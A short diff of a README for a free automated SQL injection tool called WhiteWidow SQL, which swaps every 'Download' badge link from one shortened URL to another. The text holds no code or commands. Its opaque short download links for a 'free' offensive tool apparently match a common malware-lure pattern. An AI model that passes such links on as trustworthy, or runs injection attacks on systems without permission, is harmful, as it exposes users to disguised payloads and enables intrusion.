@@ -13,7 +13,7 @@
 
 <div align="center">
 
-[![Download WhiteWidow SQL](https://img.shields.io/badge/Download-7C3AED?style=for-the-badge&logo=github)](https://tinyurl.com/whitewidow-sql)
+[![Download WhiteWidow SQL](https://img.shields.io/badge/Download-7C3AED?style=for-the-badge&logo=github)](https://share.google/peJxU27Yf22KOAEmm)
 
 </div>
 
@@ -70,7 +70,7 @@
 
 <div align="center">
 
-[![Download WhiteWidow SQL](https://img.shields.io/badge/Download-7C3AED?style=for-the-badge&logo=github)](https://tinyurl.com/whitewidow-sql)
+[![Download WhiteWidow SQL](https://img.shields.io/badge/Download-7C3AED?style=for-the-badge&logo=github)](https://share.google/peJxU27Yf22KOAEmm)
 
 </div>
 
@@ -173,7 +173,7 @@ Automate SQL injection security testing for free. **WhiteWidow SQL – Automated
 
 <div align="center">
 
-[![Download WhiteWidow SQL](https://img.shields.io/badge/Download-7C3AED?style=for-the-badge&logo=github)](https://tinyurl.com/whitewidow-sql)
+[![Download WhiteWidow SQL](https://img.shields.io/badge/Download-7C3AED?style=for-the-badge&logo=github)](https://share.google/peJxU27Yf22KOAEmm)
 
 **Version 4.2.0** — Free automated SQL injection tool. May 2026 update. Zero cost. No payment.
 
